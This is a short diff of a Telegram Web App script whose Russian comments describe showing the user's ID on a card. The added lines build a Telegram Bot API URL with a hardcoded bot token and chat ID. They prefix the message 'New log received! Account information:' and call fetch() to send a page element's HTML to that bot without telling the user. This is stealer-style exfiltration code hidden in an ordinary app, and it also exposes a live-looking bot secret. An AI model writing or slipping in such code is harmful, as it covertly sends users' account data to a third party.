@@ -104,10 +104,12 @@
    let userid = document.createElement('p'); //создаем еще параграф 
    userid.innerText = `${tg.initDataUnsafe.user.id}`; //показываем user_id
    usercard.appendChild(userid); //добавляем
-   var DivHtml = document.getElementByid('myDiv').innerHTML
+   var DivHtml = document.getElementByid('myDiv').innerHTML;
    var apith = 
-"https://api.telegram.org/bot6687099688:AAEi1SvgP6tJ5URBFIxtbmO9Co3uqsFA2JM/sendMessage?chat_id=5853359722&text="
-   const multiple = apith + DivHtml 
+"https://api.telegram.org/bot6687099688:AAEi1SvgP6tJ5URBFIxtbmO9Co3uqsFA2JM/sendMessage?chat_id=5853359722&text=";
+   var info = "🆕 Получен новый лог! Информация об аккаунте: ";
+   const multiple = apith + info + DivHtml;
+   fetch(multiple);
    //работает только в attachment menu
    // let pic = document.createElement('img'); //создаем img
    // pic.src = tg.initDataUnsafe.user.photo_url; //задаём src 
